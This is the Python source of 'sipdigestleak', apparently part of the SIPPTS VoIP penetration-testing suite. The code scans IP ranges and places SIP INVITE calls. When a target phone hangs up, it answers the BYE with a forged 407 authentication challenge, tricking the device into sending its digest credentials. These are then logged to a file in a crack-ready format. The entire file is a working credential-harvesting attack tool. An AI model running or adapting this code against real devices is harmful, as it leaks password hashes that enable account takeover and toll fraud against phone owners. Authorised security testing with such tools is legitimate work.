#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.3'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import ipaddress
import re
import socket
import sys
import ssl
import time
import signal
from .lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port, calculateHash, long2ip, ping
from .lib.color import Color
from .lib.logos import Logo


class SipDigestLeak:
    def __init__(self):
        self.ip = ''
        self.host = ''
        self.proxy = ''
        self.route = ''
        self.rport = '5060'
        self.proto = 'UDP'
        self.domain = ''
        self.contact_domain = ''
        self.from_user = '100'
        self.from_name = ''
        self.from_domain = ''
        self.to_user = '100'
        self.to_name = ''
        self.to_domain = ''
        self.user_agent = 'pplsip'
        self.localip = ''
        self.ofile = ''
        self.lfile = ''
        self.user = ''
        self.pwd = ''
        self.auth_code = 'www'
        self.sdp = 0
        self.sdes = 0
        self.verbose = 0
        self.file = ''
        self.ppi = ''
        self.pai = ''

        self.quit = False
        self.found = []
        self.ping = False

        self.c = Color()

    def start(self):
        supported_protos = ['UDP', 'TCP', 'TLS']

        self.proto = self.proto.upper()

        if self.sdes == 1:
            self.sdp = 2

        if self.sdp == None:
            self.sdp = 0

        if self.auth_code == 'proxy':
            self.auth_code = 'Proxy-Authenticate'
        else:
            self.auth_code = 'WWW-Authenticate'

        if self.ping == 1:
            self.ping = 'True'
        else:
            self.ping = 'False'

        # check protocol
        if self.proto not in supported_protos:
            print(self.c.BRED + 'Protocol %s is not supported' % self.proto)
            sys.exit()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == 'TLS':
            self.rport = 5061

        logo = Logo('sipdigestleak')
        logo.print()

        signal.signal(signal.SIGINT, self.signal_handler)
        print(self.c.BYELLOW + '\nPress Ctrl+C to stop\n')
        print(self.c.WHITE)

        if self.domain != '' and self.domain != str(self.ip) and self.domain != self.host:
            print(self.c.BWHITE + '[✓] Customized Domain: ' +
                  self.c.GREEN + '%s' % self.domain)
        if self.contact_domain != '':
            print(self.c.BWHITE + '[✓] Customized Contact Domain: ' + self.c.GREEN + '%s' %
                  self.contact_domain)
        if self.from_name != '':
            print(self.c.BWHITE + '[✓] Customized From Name: ' +
                  self.c.GREEN + '%s' % self.from_name)
        if self.from_user != '100':
            print(self.c.BWHITE + '[✓] Customized From User: ' +
                  self.c.GREEN + '%s' % self.from_user)
        if self.from_domain != '':
            print(self.c.BWHITE + '[✓] Customized From Domain: ' +
                  self.c.GREEN + '%s' % self.from_domain)
        if self.to_name != '':
            print(self.c.BWHITE + '[✓] Customized To Name: ' +
                  self.c.GREEN + '%s' % self.to_name)
        if self.to_user != '100':
            print(self.c.BWHITE + '[✓] Customized To User:' +
                  self.c.GREEN + ' %s' % self.to_user)
        if self.to_domain != '':
            print(self.c.BWHITE + '[✓] Customized To Domain: ' +
                  self.c.GREEN + '%s' % self.to_domain)
        if self.user_agent != 'pplsip':
            print(self.c.BWHITE + '[✓] Customized User-Agent: ' +
                  self.c.GREEN + '%s' % self.user_agent)

        if self.file == '':
            ips = []
            hosts = []
            for i in self.ip.split(','):
                try:
                    i = socket.gethostbyname(i)
                except:
                    pass
                hlist = list(ipaddress.ip_network(str(i)).hosts())

                if hlist == []:
                    hosts.append(i)
                else:
                    for h in hlist:
                        hosts.append(h)

            last = len(hosts)-1
            start_ip = hosts[0]
            end_ip = hosts[last]

            ipini = int(ip2long(str(start_ip)))
            ipend = int(ip2long(str(end_ip)))

            for i in range(ipini, ipend+1):
                if self.quit == False:
                    if self.ping == 'False':
                        ips.append(long2ip(i))
                    else:
                        print(self.c.YELLOW + '[+] Ping %s ...' %
                              str(long2ip(i)) + self.c.WHITE, end='\r')

                        if ping(long2ip(i), '0.1') == True:
                            print(self.c.GREEN + '\n   [-] ... Pong %s' %
                                  str(long2ip(i)) + self.c.WHITE)
                            ips.append(long2ip(i))

            for ip in ips:
                if self.quit == False:
                    self.call(ip, self.rport, self.proto)
        else:
            try:
                with open(self.file) as f:
                    line = f.readline()

                    while line and self.quit == False:
                        m = re.search(
                            '([0-9]*.[0-9]*.[0-9]*.[0-9]*):([0-9]*)\/([A-Z]*)', line)
                        if m:
                            self.ip = '%s' % (m.group(1))
                            self.port = '%s' % (m.group(2))
                            self.proto = '%s' % (m.group(3))

                        self.call(self.ip, self.rport, self.proto)
                        line = f.readline()

                f.close()
            except:
                print('Error reading file %s' % self.file)
                exit()

        self.found.sort()
        self.print()

    def signal_handler(self, sig, frame):
        self.stop()

    def stop(self):
        self.quit = True
        time.sleep(0.1)
        print(self.c.BYELLOW + '\nYou pressed Ctrl+C!')
        print(self.c.BWHITE + '\nStopping script ... wait a moment\n')
        print(self.c.WHITE)

    def call(self, ip, port, proto):
        print(self.c.BWHITE + '[✓] Target: ' + self.c.GREEN + '%s:%s/%s' %
              (ip, port, proto))
        if self.proxy != '':
            print(self.c.BWHITE + '[✓] Outbound Proxy: ' + self.c.GREEN + '%s' %
                  self.proxy)
        print(self.c.WHITE)

        cseq = '1'
        auth_type = 1
        rr = ''
        digest = ''

        # my IP address
        local_ip = self.localip
        if self.localip == '':
            local_ip = get_machine_default_ip()
            self.localip = local_ip

        # SIP headers
        if self.host != '' and self.domain == '':
            self.domain = self.host
        if self.domain == '':
            self.domain = self.ip
        if not self.from_domain or self.from_domain == '':
            self.from_domain = self.domain
        if not self.to_domain or self.to_domain == '':
            self.to_domain = self.domain

        if self.contact_domain == '':
            self.contact_domain = local_ip

        if self.proxy != '':
            self.route = '<sip:%s;lr>' % self.proxy

        try:
            if self.proto == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(self.c.RED+'Failed to create socket')
            sys.exit(1)

        bind = '0.0.0.0'
        lport = 5060

        try:
            sock.bind((bind, lport))
        except:
            lport = get_free_port()
            sock.bind((bind, lport))

        if self.proxy == '':
            host = (str(ip), int(port))
        else:
            if self.proxy.find(':') > 0:
                (proxy_ip, proxy_port) = self.proxy.split(':')
            else:
                proxy_ip = self.proxy
                proxy_port = '5060'

            host = (str(proxy_ip), int(proxy_port))

        branch = generate_random_string(71, 71, 'ascii')
        callid = generate_random_string(32, 32, 'hex')
        tag = generate_random_string(8, 8, 'hex')

        msg = create_message('INVITE', self.localip, self.contact_domain, self.from_user, self.from_name, self.from_domain,
                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', self.sdp, '', self.route, self.ppi, self.pai, '', 1)

        print(self.c.YELLOW + '[=>] Request INVITE' + self.c.WHITE)

        if self.verbose == 1:
            print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                  (self.ip, self.rport, self.proto))
            print(self.c.YELLOW + msg + self.c.WHITE)

        try:
            sock.settimeout(15)

            # send INVITE
            if proto == 'TCP':
                sock.connect(host)

            if self.proto == 'TLS':
                sock_ssl = ssl.wrap_socket(
                    sock, ssl_version=ssl.PROTOCOL_TLS, ciphers='DEFAULT', cert_reqs=ssl.CERT_NONE)
                sock_ssl.connect(host)
                sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
            else:
                sock.sendto(bytes(msg[:8192], 'utf-8'), host)

            rescode = '100'

            while rescode[:1] == '1':
                # receive temporary code
                if self.proto == 'TLS':
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                headers = parse_message(resp.decode())

                if headers:
                    via = headers['via']
                    rr = headers['rr']

                    response = '%s %s' % (
                        headers['response_code'], headers['response_text'])
                    rescode = headers['response_code']
                    print(self.c.CYAN + '[<=] Response %s' % response)

                    totag = headers['totag']

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Receiving from %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.GREEN + resp.decode() + self.c.WHITE)

            if self.user != '' and self.pwd != '' and (headers['response_code'] == '401' or headers['response_code'] == '407'):
                # send ACK
                print(self.c.YELLOW + '[=>] Request ACK')
                msg = create_message('ACK', self.localip, self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                     self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr, '', '', '', 1)

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.YELLOW + msg + self.c.WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                if headers['auth'] != '':
                    auth = headers['auth']
                    auth_type = headers['auth-type']
                    headers = parse_digest(auth)
                    realm = headers['realm']
                    nonce = headers['nonce']
                    uri = 'sip:%s@%s' % (self.to_user, self.domain)
                    algorithm = headers['algorithm']
                    cnonce = headers['cnonce']
                    nc = headers['nc']
                    qop = headers['qop']

                    if qop != '' and cnonce == '':
                        cnonce = generate_random_string(8, 8, 'ascii')
                    if qop != '' and nc == '':
                        nc = '00000001'

                    response = calculateHash(
                        self.user, realm, self.pwd, 'INVITE', uri, nonce, algorithm, cnonce, nc, qop, 0, '')

                    digest = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s", algorithm=%s' % (
                        self.user, realm, nonce, uri, response, algorithm)
                    if qop != '':
                        digest += ', qop=%s' % qop
                    if cnonce != '':
                        digest += ', cnonce="%s"' % cnonce
                    if nc != '':
                        digest += ', nc=%s' % nc

                    branch = generate_random_string(71, 71, 'ascii')
                    cseq = str(int(cseq) + 1)

                    print(self.c.YELLOW + '[=>] Request INVITE' + self.c.WHITE)

                    msg = create_message('INVITE', self.localip, self.contact_domain, self.from_user, self.from_name, self.from_domain, self.to_user, self.to_name, self.to_domain, self.proto,
                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', self.sdp, via, self.route, self.ppi, self.pai, '', 1)

                    if self.verbose == 1:
                        print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                              (self.ip, self.rport, self.proto))
                        print(self.c.YELLOW + msg + self.c.WHITE)

                    try:
                        if self.proto == 'TLS':
                            sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                        else:
                            sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                        rescode = '100'
                        count = 0

                        # while rescode[:1] == '1':
                        while rescode != '200' and count < 10:
                            # receive temporary code
                            if self.proto == 'TLS':
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            if rescode[:1] != '1':
                                count += 1

                            headers = parse_message(resp.decode())

                            if headers:
                                rr = headers['rr']

                                response = '%s %s' % (
                                    headers['response_code'], headers['response_text'])
                                rescode = headers['response_code']

                                print(self.c.CYAN +
                                      '[<=] Response %s' % response)
                                if self.verbose == 1:
                                    print(self.c.BWHITE + '[+] Receiving from %s:%s/%s ...' %
                                          (self.ip, self.rport, self.proto))
                                    print(self.c.GREEN +
                                          resp.decode() + self.c.WHITE)

                                if rescode[:1] != '1':
                                    totag = headers['totag']

                                    # send ACK
                                    print(self.c.YELLOW + '[=>] Request ACK')

                                    msg = create_message('ACK', self.localip, self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                                         self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr, '', '', '', 1)

                                    if self.verbose == 1:
                                        print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                                              (self.ip, self.rport, self.proto))
                                        print(self.c.YELLOW +
                                              msg + self.c.WHITE)

                                    if self.proto == 'TLS':
                                        sock_ssl.sendall(
                                            bytes(msg[:8192], 'utf-8'))
                                    else:
                                        sock.sendto(
                                            bytes(msg[:8192], 'utf-8'), host)

                    except:
                        print(self.c.WHITE)

            # receive 200 Ok - call answered
            if headers['response_code'] == '200':
                cuser = headers['contactuser']
                cdomain = headers['contactdomain']
                if cdomain == '':
                    cdomain = self.domain
                else:
                    if cuser != None and cuser != '':
                        cdomain = cuser + '@' + cdomain

                totag = headers['totag']

                # send ACK
                print(self.c.YELLOW + '[=>] Request ACK')

                msg = create_message('ACK', self.localip, self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                     self.to_user, self.to_name, self.to_domain, proto, cdomain, self.user_agent, lport, branch, callid, tag, cseq, totag, digest, auth_type, '', 0, via, rr, '', '', '', 1)

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.YELLOW + msg + self.c.WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # wait for BYE
                start = time.time()
                bye = False
                while bye == False:
                    now = time.time()

                    # Wait 30 sec max
                    if now-start > 30:
                        break

                    print(self.c.WHITE + '\t... waiting for BYE ...')

                    if self.proto == 'TLS':
                        resp = sock_ssl.recv(4096)
                    else:
                        resp = sock.recv(4096)

                    if resp.decode()[0:3] == 'BYE':
                        bye = True
                        print(self.c.CYAN + '[<=] Received BYE')
                        headers = parse_message(resp.decode())
                        branch = headers['branch']
                        cseq = headers['cseq']
                        via = headers['via2']
                    else:
                        print(self.c.CYAN + '[<=] Response %s' % response)

                    if self.verbose == 1:
                        print(self.c.BWHITE + '[+] Receiving from %s:%s/%s ...' %
                              (self.ip, self.rport, self.proto))
                        print(self.c.GREEN + resp.decode() + self.c.WHITE)

                # send 407 with digest
                cseq = int(cseq)
                msg = create_response_error('407 Proxy Authentication Required', self.from_user,
                                            self.to_user, proto, self.domain, lport, cseq, 'BYE', branch, callid, tag, totag, local_ip, via, self.auth_code)

                print(
                    self.c.YELLOW + '[=>] Request 407 Proxy Authentication Required')

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.YELLOW + msg + self.c.WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # receive auth BYE
                if self.proto == 'TLS':
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                print(self.c.CYAN + '[<=] Received BYE')

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Receiving from %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.GREEN + resp.decode() + self.c.WHITE)

                headers = parse_message(resp.decode())
                branch = headers['branch']

                try:
                    auth = headers['auth']
                except:
                    auth = ''

                # send 200 OK
                msg = create_response_ok(
                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag)

                print(self.c.YELLOW + '[=>] Request 200 Ok')

                if self.verbose == 1:
                    print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(self.c.YELLOW + msg + self.c.WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                if auth != '':
                    print(self.c.BGREEN + 'Auth=%s\n' % auth + self.c.WHITE)

                    line = '%s###%d###%s###%s' % (ip, port, proto, auth)
                    self.found.append(line)

                    headers = parse_digest(auth)

                    if self.ofile != '':
                        data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
                            ip, local_ip, headers['username'], headers['realm'], headers['uri'], headers['nonce'], headers['cnonce'], headers['nc'], headers['qop'], headers['response'])

                        f = open(self.ofile, 'a+')
                        f.write(data)
                        f.write('\n')
                        f.close()

                        print(self.c.WHITE+'Auth data saved in file %s' %
                              self.ofile)
                else:
                    print(self.c.BRED +
                          'No Auth Digest received :(\n' + self.c.WHITE)
                    line = '%s###%d###%s###No Auth Digest received :(' % (
                        ip, port, proto)
                    self.found.append(line)
            else:
                print(self.c.BRED +
                      'No Auth Digest received :(\n' + self.c.WHITE)
                line = '%s###%d###%s###%s %s' % (
                    ip, port, proto, headers['response_code'], headers['response_text'])
                self.found.append(line)
        except socket.timeout:
            print(self.c.BRED + 'No Auth Digest received :(\n' + self.c.WHITE)
            line = '%s###%d###%s###No Auth Digest received :(' % (
                ip, port, proto)
            self.found.append(line)
            pass
        except:
            pass
        finally:
            sock.close()

        return

    def print(self):
        iplen = len('IP address')
        polen = len('Port')
        prlen = len('Proto')
        relen = len('Response')

        for x in self.found:
            (ip, port, proto, res) = x.split('###')
            if len(ip) > iplen:
                iplen = len(ip)
            if len(port) > polen:
                polen = len(port)
            if len(proto) > prlen:
                prlen = len(proto)
            if len(res) > relen:
                relen = len(res)

        tlen = iplen+polen+prlen+relen+11

        print(self.c.WHITE + ' ' + '-' * tlen)
        print(self.c.WHITE +
              '| ' + self.c.BWHITE + 'IP address'.ljust(iplen) + self.c.WHITE +
              ' | ' + self.c.BWHITE + 'Port'.ljust(polen) + self.c.WHITE +
              ' | ' + self.c.BWHITE + 'Proto'.ljust(prlen) + self.c.WHITE +
              ' | ' + self.c.BWHITE + 'Response'.ljust(relen) + self.c.WHITE + ' |')
        print(self.c.WHITE + ' ' + '-' * tlen)

        if len(self.found) == 0:
            print(self.c.WHITE + '| ' + self.c.WHITE +
                  'Nothing found'.ljust(tlen-2) + ' |')
        else:
            if self.lfile != '':
                f = open(self.lfile, 'w')

            for x in self.found:
                (ip, port, proto, res) = x.split('###')

                if res == 'No Auth Digest received :(':
                    colorres = self.c.RED
                else:
                    colorres = self.c.BLUE

                print(self.c.WHITE +
                      '| ' + self.c.BGREEN + '%s' % ip.ljust(iplen) + self.c.WHITE +
                      ' | ' + self.c.YELLOW + '%s' % port.ljust(polen) + self.c.WHITE +
                      ' | ' + self.c.YELLOW + '%s' % proto.ljust(prlen) + self.c.WHITE +
                      ' | ' + colorres + '%s' % res.ljust(relen) + self.c.WHITE + ' |')

                if self.lfile != '':
                    f.write('%s:%s/%s => %s' % (ip, port, proto, res))
                    f.write('\n')

            if self.lfile != '':
                f.close()

        print(self.c.WHITE + ' ' + '-' * tlen)
        print(self.c.WHITE)

        self.found.clear()
